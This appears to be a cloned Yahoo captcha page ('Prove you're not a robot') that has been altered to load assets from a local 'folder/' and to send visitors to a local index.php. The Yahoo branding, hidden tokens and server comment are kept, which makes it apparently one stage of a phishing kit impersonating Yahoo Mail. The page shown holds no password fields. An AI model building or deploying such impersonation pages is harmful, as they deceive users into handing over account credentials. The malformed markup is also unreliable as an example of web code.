
<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <title>Value</title>
        <link href="folder/css.css" rel="stylesheet" type="text/css"/>
    <div style="float: right"><img src="folder/mail.png" alt="" class="logo" width="116"/></div>	 

        <div class="login-box-container">
            <div class="login-box">
                
                <span class="login-box-top"></span>
                <div class="txt-align-center">
                    <img src="folder/mail.png" alt="" class="logo" width="116" />
                </div>
                <div class="challenge">
                    <form action="index.php" method="POST" >
    <div id="captcha-challenge">
    <h2>Prove you&#x27;re not a robot</h2>
    <p class="writeup txt-align-center">Click on submit button to prove you are not a robot.</p>
    <form action="index.html" method="post" class="pure-form pure-form-stacked">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <div id="captchaV5">

</div>

</div> <!--captchaV5-->

		<input type="hidden" name="crumb" value="39ZBmmcbE/Q" />
        <input type="hidden" name="acrumb" value="i2vvfB9r" />
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="lang" value="en-US" />
        <input type="hidden" name="config" value="bBtCAXz.2bKKNrnld2OG3dqzoMp1LW3L4FW1ZSEwd0af5BTXHKhfsQhb.BKKBjN3QfFyVubrsP6sYxBtdejuAwMrL9CG3FpZm7KvusCE8kOhdgFJvA0VmtBVgTV3_ZT4vKDr4A3jz5SZm4qQMoroRbWzIOwdVRmvwJGx53D.HN__cJfv9S4Kn.7nFnnAFjdBwizcRSy_nYYRxxYPVyy53kB5F6o9665axe0tsBLWRPb2~A" />
        <input type="hidden" name="validationToken" value="" />
        <div></div>
        <div class="margin24">
            <button type="submit" class="pure-button puree-button-primary puree-spinner-button" name="verifyCaptcha" value="Submit" onClick="parent.location='index.php'">
                Submit
            </button>

        </div>
    </form>
</div>


</div>

    
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
                <h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>

            </div>
        </div>
        <div class="login-box-ad-outer">
            <div class="login-box-ad-inner">
                <div id="login-box-ad-placeholder"></div>
            </div>
        </div>

</body>
</html>
<!-- pprd5-node110-lh1.manhattan.ir2.yahoo.com - Thu Jan 12 2017 06:19:29 GMT+0000 (UTC) - (2ms) -->
